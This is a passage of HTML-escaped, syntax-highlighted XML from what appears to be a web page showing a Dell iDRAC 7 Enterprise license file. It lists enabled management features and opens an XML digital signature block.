&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;15&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SMASH CLP&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;16&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;IPv6&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;17&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Dynamic DNS&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;18&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Dedicated NIC&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;19&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Directory Services&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;20&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Two-Factor Authentication&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;21&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Single Sign-On&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;22&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;PK Authentication&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;23&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Crash Screen Capture&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;24&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Crash Video Capture&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;25&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Boot Capture&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;26&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Virtual Console&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;27&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Virtual Flash Partitions&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;28&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Console Collaboration&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;29&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Device Monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;30&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Remote Inventory&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;31&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Storage Monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;32&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Remote Firmware Update&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;33&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Remote Firmware Configuration&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;34&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Remote Inventory Export&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;35&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Remote Operating System Deployment&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;36&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Backup and Restore&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;37&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Part Replacement&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;38&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SSH&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;39&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Remote File Share&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;40&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Virtual Folders&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;41&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Web GUI&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;42&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Network Time Protocol&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;43&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Email Alerts&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;44&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Security Lockout&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;45&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Remote Syslog&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nt&#34;&gt;&amp;lt;lns:Feature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:ID=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;253&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Description=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Integrated Dell Remote Access Controller 7 Enterprise&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lns:Enabled=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;lt;/lns:LicenseData&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:Signature&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:dsig=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/09/xmldsig#&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:SignedInfo&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:CanonicalizationMethod&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;Algorithm=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/10/xml-exc-c14n#&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:SignatureMethod&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;Algorithm=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/09/xmldsig#rsa-sha1&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:Reference&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;URI=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:Transforms&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:Transform&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;Algorithm=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:Transforms&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:DigestMethod&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;Algorithm=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2000/09/xmldsig#sha1&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dsig:DigestValue&amp;gt;&lt;/span&gt;DrtnjP0vUsyT+18jazjmiaGrvc0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:DigestValue&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dsig:Reference&amp;gt;&lt;/span&gt;
